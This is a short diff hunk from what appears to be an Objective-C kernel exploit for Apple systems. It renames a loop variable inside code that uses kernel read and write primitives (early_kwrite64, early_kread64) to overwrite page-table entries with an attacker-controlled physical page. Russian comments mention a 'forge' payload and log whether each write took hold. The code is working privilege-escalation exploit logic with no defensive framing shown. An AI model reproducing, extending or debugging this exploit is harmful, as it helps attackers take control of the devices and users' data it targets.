@@ -6312,14 +6312,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                       run, dir > 0 ? "asc" : "desc", (unsigned long long)kva, o, ctlPFN]);
                             // 1.9.241: ТОЛЬКО page-0 (lo32==pfn32) — иначе все 32 страницы
                             // мапятся в ОДНУ ctl и forge-пэйлоад перезапишется хвостами.
-                            for (uint32_t r = 0; r < run; r++) {
-                                uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
+                            for (uint32_t ri = 0; ri < run; ri++) {
+                                uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)ri * 8, 8);
                                 if ((uint32_t)qn != pfn32) continue;
                                 usleep(1500);
-                                early_kwrite64(kva + o + (uint64_t)r * 8, (qn & 0xffffffff00000000ULL) | ctlPFN);
-                                uint64_t rb = early_kread64(kva + o + (uint64_t)r * 8);
-                                kpNote(r, [NSString stringWithFormat:@"      readback[%u]: %#018llx — %@", r, (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                                hitAddr[nDep] = kva + o + (uint64_t)r * 8; hitOld[nDep] = qn; hitForm[nDep] = 2; nDep++;
+                                early_kwrite64(kva + o + (uint64_t)ri * 8, (qn & 0xffffffff00000000ULL) | ctlPFN);
+                                uint64_t rb = early_kread64(kva + o + (uint64_t)ri * 8);
+                                kpNote(r, [NSString stringWithFormat:@"      readback[%u]: %#018llx — %@", ri, (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                                hitAddr[nDep] = kva + o + (uint64_t)ri * 8; hitOld[nDep] = qn; hitForm[nDep] = 2; nDep++;
                             }
                             continue;
                         }
